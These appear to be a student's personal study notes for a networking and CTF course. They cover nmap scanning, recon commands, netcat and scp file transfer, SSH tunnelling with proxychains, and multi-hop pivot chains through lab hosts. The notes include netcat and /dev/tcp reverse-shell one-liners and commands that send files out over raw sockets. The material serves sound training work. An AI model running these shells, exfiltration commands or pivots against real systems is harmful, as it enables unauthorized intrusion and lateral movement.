    - Follow-on actions based on ports found
	+ if 21 or 80 wget -r [ip addr] (or) wget -r ftp://[ip addr] (or) firefox
	+if 22 or 23 connect and PASSIVE RECON
	+if no 22 or 23 and you NEED to GET ON the box and you have port 21
		+ FTP[ip addr] connects to ftp server
			- passive
			- ls
			- get[file name]

Scan Methodology
	NMAP -Pn [ip addr] -T4 -p 21-23,80

	- Quick Scan Ports 21-23, 80
	- Specific ports based on hints/clues found
	-Well known port range
	- Which tcpdump wireshark nmap telnet get curl ping

		+ 0 - 1023 (Actually scan 1-1023)
	- Chunkcs of 2000 or first 10000 ports (65535)
	- hail mary - Scan all the ports (65535)

Passive Recon Methodology
	Italicized/bolded words are commands

		-hostname
		-permisssions:
			+sudo -l
		-interfaces and subnets
			+ip a
			+ show interface [vyos]
		-Neighbors
			+ip neigh
		-Routing Table
			+ip route
			+ show ip route [vyos]

		-Files of intest
			+find / -iname flag*
			+find / -iname hint*

		-Other listening ports
			+ss -ntlp

		-Other tools
			+ which tcpdump wireshark nmap telnet get curl ping
```
## ARP SCANNING 
```
arp-scan --interface=eth0 --localnet

nmap -sP -PR 172.16.82.96/27
```
## MAPPING // [https://1drv.ms/u/s!Arz6vf8sVG8vgpMsQ1RRtb0rcP7x4w?e=R9tlao](https://app.diagrams.net/)

## CTF:
Entry Float IP: 10.50.37.85
```
    Your Network Number is 2 (Given by Instructor)

    Credentials: net2_studentX:passwordX

    X is your student number
```
## Day 4 File Transfer and Redirection  /// https://net.cybbh.io/-/public/-/jobs/875409/artifacts/modules/networking/slides-v4/09_file_transfer.html

## SCP Syntax
```
## Download a file from a remote directory to a local directory

$ scp student@172.16.82.106:secretstuff.txt /home/student

## Upload a file to a remote directory from a local directory

$ scp secretstuff.txt student@172.16.82.106:/home/student

## Copy a file from a remote host to a separate remote host

$ scp -3 student@172.16.82.106:/home/student/secretstuff.txt student@172.16.82.112:/home/student
password:    password:

## SCP Syntax
Recursive upload of a folder to remote

$ scp -r folder/ student@172.16.82.106:

Recursive download of a folder from remote

$ scp -r student@172.16.82.106:folder/ .

SCP Syntax w/ alternate SSHD
Download a file from a remote directory to a local directory

$ scp -P 1111 student@172.16.82.106:secretstuff.txt .

Upload a file to a remote directory from a local directory

$ scp -P 1111 secretstuff.txt student@172.16.82.106:
```
## SCp Syntax Through a Tunnel
```
Create a local port forward to target device

$ ssh student@172.16.82.106 -L 1111:localhost:22 -NT

Download a file from a remote directory to a local directory

$ scp -P 1111 student@localhost:secretstuff.txt /home/student

Upload a file to a remote directory from a local directory

$ scp -P 1111 secretstuff.txt student@localhost:/home/student
```
## UNCOMMON Methods of file transfers
```
    Listener (receive file):

nc -lvp 9001 > newfile.txt

    Client (sends file):

nc 172.16.82.106 9001 < file.txt

    Listener (sends file):

nc -lvp 9001 < file.txt

    Client (receive file):

nc 172.16.82.106 9001 > newfile.txt
```
## Netcat Relay
```
Listener - Listener

    On Blue_Host-1 Relay:

$ mknod mypipe p
$ nc -lvp 1111 < mypipe | nc -lvp 3333 > mypipe

    On Internet_Host (send):

$ nc 172.16.82.106 1111 < secret.txt

    On Blue_Priv_Host-1 (receive):

$ nc 192.168.1.1 3333 > newsecret.txt
```
## File Transfer with /dev/tcp
```
    On the receiving box:

$ nc -lvp 1111 > devtcpfile.txt

    On the sending box:

$ cat secret.txt > /dev/tcp/10.10.0.40/1111

    This method is useful for a host that does not have NETCAT available.
```
## REVERSE SHELL
```
    First listen for the shell on your device.

$ nc -lvp 9999

    On Victim using -c :

$ nc -c /bin/bash 10.10.0.40 9999

    On Victim using -e :

$ nc -e /bin/bash 10.10.0.40 9999

## Reverse shell using /DEV/TCP

    First listen for the shell on your device.

$ nc -lvp 9999

    On Victim:

$ /bin/bash -i > /dev/tcp/10.10.0.40/9999 0<&1 2>&1
```
## Transfer file with Base64
```
    generate the base64 output of a file, with line wrapping removed

$ base64 -w0 logoCyber.png

    copy the output

Decode with -d
$ base64 -d b64image.png > logoCyber.png

nc allows a ip to connect via port
nc -lvp opens a listening port
```
## SSH TUNNELS // https://net.cybbh.io/-/public/-/jobs/875409/artifacts/modules/networking/slides-v4/08_tunneling.html

## Remove an old ssh connection Host Key.
```
ssh-keygen -f "/home/student/.ssh/known_hosts" -R "172.16.82.106"
```
## SSH Options
```
    -L - Creates a port on the client mapped to a ip:port via the server

    -D - Creates a port on the client and sets up a SOCKS4 proxy tunnel where the target ip:port is specified dynamically

    -R - Creates the port on the server mapped to a ip:port via the client

    -NT - Do not execute a remote command and disable pseudo-tty (will hang window)
```
## SSH LOcal Forwarding
```
ssh -p <optional alt port> <user>@<server ip> -L <local bind port>:<tgt ip>:<tgt port> -NT

or

ssh -L <local bind port>:<tgt ip>:<tgt port> -p <alt port> <user>@<server ip> -NT
```
## Dynamic Port Forwarding
```
ssh <user>@<server ip> -p <alt port> -D <port> -NT
or
ssh -D <port> -p <alt port> <user>@<server ip> -NT

Proxychains default port is 9050

ssh -D 9050
```
## ssh -D 9050 student@172.16.1.15

## Remote Port Forwarding:
```
ssh -R <remote bind port>:<tgt ip>:<tgt port> -p <alt port> <user>@<server ip> -NT
```
## Bridging Local and Remote Port Forwarding
```
Internet_Host:
ssh student@172.16.1.15 -L 2223:172.16.40.10:23 -NT
or
ssh -L 2223:172.16.40.10:23 student@172.16.1.15 -NT

Internet_Host:
telnet localhost 2223
Blue_INT_DMZ_Host-1~$

Blue_INT_DMZ_Host-1:
ssh student@172.16.1.15 -R 1122:localhost:22
or
ssh -R 1122:localhost:22 student@172.16.1.15

Internet_Host:
ssh student@172.16.1.15 -L 2222:localhost:1122
or
ssh -L 2222:localhost:1122 student@172.16.1.15

Internet_Host:
ssh student@localhost -p 2222 -D 9050
or
ssh -D 9050 student@localhost -p 2222
```
Scan first pivot

First Pivot External Active Recon

Enumerate first pivot

Scan second pivot

Enumerate second pivot

Scan third pivot

Enumerate third pivot

Scan forth pivot

Enumerate forth pivot

etc, etc
https://net.cybbh.io/public/networking/latest/08_tunneling/fg.html
https://net.cybbh.io/-/public/-/jobs/875409/artifacts/modules/networking/slides-v4/08_tunneling.html

## Tunnels
```
Target?
Who can see target?
How do we get there?
Tunnel Type?
RHP?
```
## Steps    
ops  -----  PC1  ----- PC2 ----- PC3
            (22)    (22,21899)  (22,23)

#Local Tunnel opening port 21801 on Ops to tunnel to 100.1.1.2 (PC2) on port 22

OPS>/: ssh PC1@10.50.x.x -L 21801  :100.1.1.2:22 -NT 
(OPS)        (PC1)          (OPS)       (PC2)           

#Local Tunnel opening port 21802 on OPS to tunnel to PC3
OPS>/: ssh PC2@127.0.0.1 -p 21802 -L  21805 :PC3:23 -NT     -----> OPS>/: Telnet 127.0.0.1 21805 
(OPS)       (PC2)           (OPS)             (PC3)    

#Remote
Whats are Target?


	 how do we get there?
OPS>/:  ssh PC2@<internal facing IP>  -R   21899: localhost:22   -----> ssh PC2@localhost -p 21801 -L 21806:127.0.0.1:21899 ----> ssh PC3@localhost -p 21806 -D 9050 -NT
		(PC2)		         (RHP PC2)    (PC3)                                           <RHP>


## EXAMPLE
```
telnet 10.50.39.228
ssh net2_student18@10.3.0.10 -R 21801:localhost:22
ssh net2_student18@10.50.41.243 -L 21802:localhost:21801 -NT
ssh net2_student18@localhost -p 21802 -L 21803:10.2.0.2:80
ssh net2_student18@localhost -p 21802 -D 9050 -NT
```
## RICK and Morty
```
RICK>: Telnet 10.50.32.176 ----> (Remote Back) ssh student@10.50.42.163 -R 21899:localhost:22 -NT ===>  BIH>: ssh net2_student18@localhost -p 21899 -D 9050 -NT (then ennumerate Morty)

BIH>: ssh net2_student18@localhost -p 21899 -L 21801:10.1.2.18:2222 -NT ===> ssh net2_student18@localhost -21802 -D 9050 -NT (ennumerate Jerry)

BIH>: ssh net2_student18@localhost -p 21802 -L 21803:172.16.10.121:2323 -NT =====> ssh net2_student18@localhost -p 21803 -D 9050 -NT (ennumerate Beth)

BIH>: ssh net2_student18@localhost -p 21803 -L 21804:192.168.10.69:22 -NT =====> ssh net2_student18@localhost -p 21804 -D 9050 -NT (ennumerate message) 
``` 
## proxychains nc 192.168.10.71 2323 (banner grabbing a port)

## FUCKKKK
```
telnet 10.50.42.86 -------> ssh student@10.50.42.163 -R 21899:localhost:22 (telnet to floating IP then created a Remote tunnel back to BIH / enumm devices)

BIH>: ssh net2_student18@localhost -p 21899 -L 21802:192.168.0.40:5555 -NT (Tunnel going to the .40 device)

192.168.0.40>: ssh net2_student18@localhost -p 21802 -L 21804:172.16.0.60:23 -NT (Tunnel going from the .40 to the .60 TELNET PORT network via telnet port)

BIH>: telnet localhost 21804 -------->

172.16.0.60>: ssh net2_student18@192.168.0.40 -p 5555 -R 21895:localhost:22 -NT (created a Remote tunnel via SSH back to the .40 from the 172.16.0.60 device) 

BIH>: ssh net2_student18@localhost -p 21802 -L 21810:localhost:21895 -NT ( created a local tunnel to the .40 on the same port I used to create  the first local tunnel to the .40)

BIH>: ssh net2_comrade18@localhost -p 21810 (connecting the two Remote tunnels together)
```
## FUTURE 
![image](https://github.com/user-attachments/assets/e8e3f7d6-f391-452e-beec-2e0c6f3971dc)
```
ssh student@localhost -L 21801:10.50.38.13:1234 -NT

ssh net2_student18@localhost -p 21801 -L 21802:172.17.17.28:23 -NT

telnet localhost 21802 =====>  ssh net2_student18@172.17.17.17 -p 1234 -R 21899:localhost:4321 -NT

ssh net2_student18@localhost -p 21801 -L 21803:localhost:21899 -NT

ssh net2_student18@localhost -p 21803 -L 21804:192.168.30.150:1212 -NT

ssh net2_student18@localhost -p 21804 -L 21805:10.10.12.121:2932 -NT

ssh net2_student18@localhost -p 21805 -D 9050 -NT

proxychains nc localhost 23456
```
## Network Analysis

## Ephemeral Ports
```
    IANA 49152–65535

    Linux 32768–60999

    Windows XP 1025–5000

    Win 7/8/10 use IANA

    Win Server 2008 1025–60000

    Sun Solaris 32768–65535
```
![image](https://github.com/user-attachments/assets/1013d9c1-d61b-4c0c-afae-ad59a467cce5)

##Some Indicators
```
    .exe/executable files

    NOP sled

    Repeated Letters

    Well Known Signatures

    Mismatched Protocols

    Unusual traffic

    Large amounts of traffic/ unusual times
```
## South Park
![image](https://github.com/user-attachments/assets/5e50a8a7-a8bf-4c39-b0db-c72de2c754d4)

```
telnet 10.50.23.236 ---> ssh student@10.50.42.163 -R 21899:localhost:8462 -NT (Telnet to Eric, create a remote tunnel back to BIH)

ssh net2_student18@localhost -p 21899 -L 21801:192.168.100.60:22 -NT (Create a local tunnel going to Kenny)

ssh net2_student18@localhost -p 21801 -L 21802:10.90.50.140:6481 -NT (Create a local tunnel going to Kyle)

ssh net2_student18@localhost -p 21802 -L 21803:172.20.21.5:23 -NT (Create a local tunnel going to Stan via telnet port 23)

telnet localhost 21803 (Telnet to stan)  ----> ssh net2_student18@172.20.21.4 -p 6481 -R 21898:localhost:22 -NT (creating a remote tunnel going back to Kyle)

ssh net2_student18@localhost -p 21802 -L 21805:localhost:21898 -NT (Connecting the two Remote Tunnels. -p will be the port opened up for that device 21802)

ssh net2_student18@localhost -p 21805  -----> ss -ntlp

ssh net2_student18@localhost -p 21805 -D 9050 -NT
```

